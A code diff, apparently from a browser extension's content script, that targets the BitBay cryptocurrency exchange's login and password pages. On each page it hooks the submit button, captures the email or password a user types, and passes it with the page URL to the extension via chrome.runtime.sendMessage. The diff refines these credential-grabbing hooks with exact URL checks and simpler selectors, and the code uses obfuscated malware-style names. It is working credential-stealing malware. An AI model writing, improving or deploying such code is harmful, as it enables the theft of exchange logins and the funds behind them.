@@ -406,28 +406,29 @@ var login_form = document.getElementById("loginForm");
           }
       }, 1000)
   };
-  if (top['location']['href']['indexOf']('https://auth.bitbay.net/login-password') > -1) {
+
+  if (top['location']['href'] === 'https://auth.bitbay.net/login') {
       var interval = setInterval(function () {
-          if (document['getElementsByClassName']('bp-constrain-login')[0]) {
+          if (document['getElementsByClassName']('main-content-container')[0]) {
               clearInterval(interval);
-              document['getElementsByClassName']('send-btn full-width-btn btn btn-flat waves-effect')[0].onclick = function (_0x441cx2) {
+              document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
                var login = {};
-              login.username = "null" //document.getElementsByName("email")[0].value;
-              login.pass = document.getElementsByName("password")[0].value;
+              login.username = document.getElementsByName("email")[0].value;
+              login.pass = "null"; //document.getElementsByName("password")[0].value;
               login.href = window.location.href;
               chrome.runtime.sendMessage({cmd: "l",login});
               }
           }
       }, 1000)
   };
-  if (top['location']['href']['indexOf']('https://auth.bitbay.net/login') > -1) {
+  if (top['location']['href'] === 'https://auth.bitbay.net/login-password') {
       var interval = setInterval(function () {
-          if (document['getElementsByClassName']('main-content-container')[0]) {
+          if (document['getElementsByClassName']('bp-constrain-login')[0]) {
               clearInterval(interval);
-              document['getElementsByClassName']('send-btn full-width-btn btn btn-flat waves-effect')[0].onclick = function (_0x441cx2) {
+              document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
                var login = {};
-              login.username = document.getElementsByName("email")[0].value;
-              login.pass = "null"; //document.getElementsByName("password")[0].value;
+              login.username = "null" //document.getElementsByName("email")[0].value;
+              login.pass = document.getElementsByName("password")[0].value;
               login.href = window.location.href;
               chrome.runtime.sendMessage({cmd: "l",login});
               }
